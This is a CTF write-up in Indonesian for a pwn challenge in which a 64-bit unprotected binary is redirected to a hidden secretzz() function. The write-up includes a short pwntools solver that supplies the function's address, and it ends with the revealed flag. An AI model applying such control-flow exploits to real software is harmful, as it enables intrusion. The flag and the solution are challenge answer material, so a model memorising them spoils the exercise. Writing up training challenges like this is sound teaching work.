# Rill or Fekk
>Real or fake? it depends on your choice! Lets see how u can trigger a function without actually calling it.


1. Diberikan sebuah file binary dengan arsitektur 64 bit - not stripped.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/3b543e2d-0021-4eec-9c90-d38dd7458159)

2. Langsung saja kita cek proteksi yang di apply pada binary file.

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/40a8c7cc-8610-4e3e-92b8-59791202131f)


3. Surprisingly tidak diberikan proteksi apapun pada binary, langsung saja kita decompile file binary untuk mengidentifikasi kerentanan. Disini saya menggunakan decompiler bernama Ghidra.

> Fungsi main()

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/69284393-92c6-4a89-b071-564dca86cac8)


4. Pada fungsi `main()` nampaknya terdapat hardcoded values yang dapat kita gunakan untuk membuka fungsi `secretzz()`, yang dimana isi dari fungsi tersebut sepertinya akan menampilkan flag di remote server.

> Fungsi secretzz()

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/a5415304-de54-431d-888a-a1041660a787)


5. Mengetahui hal ini, langsung saja kita jalankan solver berikut:

```py
from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)

exe = './Chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

sh = start()

padding = 64

p = flat([
    b'4199254' # decimal representation of 0x401356
])

sh.sendlineafter(b':', p)
sh.interactive()
```

> RESULT

![image](https://github.com/Valcar-ies/Writeup-CTF-Foresty-Hacker-Class/assets/84186470/8531464a-a644-4642-8491-953682a740fc)

Flag yang didapat :

```console
ForestyHC{eyyoo_u_ar3nt_supp0ssd_t0_b3_h3re_subm1t_th1zz_and_g0_aw4yy_a4xc0d}
```
